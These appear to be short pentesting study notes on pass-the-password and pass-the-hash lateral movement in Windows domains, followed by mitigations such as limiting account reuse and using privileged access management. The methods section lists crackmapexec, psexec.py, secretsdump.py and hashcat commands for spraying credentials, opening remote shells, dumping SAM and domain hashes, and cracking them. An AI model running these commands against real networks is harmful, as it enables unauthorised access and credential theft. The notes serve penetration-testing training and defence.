Pass the Pass/Hash

# Pass the Pass/Hash


**Overview:**
Credentials Required...
Passing our captured credentials around the network


**Tools:**
- crackmapexec
- psexec.py
- secretsdump.py

**Methods:**


Run: `crackmapexec <Subnet> -u <User> -d <Domain> -p <Password>`
Will give a list, look for the Pwn3d! ones

Run: `psexec.py <Domain>/<User>:<Password>@<IP>`
Will result in a shell hopefully.

Run: `crackmapexec <Subnet> -u <User> -d <Domain> -p <Password> --sams`
Will result in a list of hashes hopefully.

Run: `secretsdump.py <Domain>/<User>:<Password>@<IP>`
Will result in a list of hashes hopefully.
Run: `hashcat -m 1000 hashes.txt rockyou.txt -O`

`crackmapexec <Subnet> -u <User> -H <hash> --local`


**Mitigation:**
Hard to completely prevent but can make attackers job difficult

Limit account re-use
- Avoid reusing local admin password
- Disable guest and Administrator accounts
- Limit who is a local administrator(least privilege)

Utilize strong passwords:
- The longer the better
- Avoid common words
- I like long sentences

Privilege Access Management (PAM):
- Check out/in sensitive accounts when needed
- Automatically rotate passwords on chek out and check in
- Limit pass atacks as hash/password is strong and constantly rotated

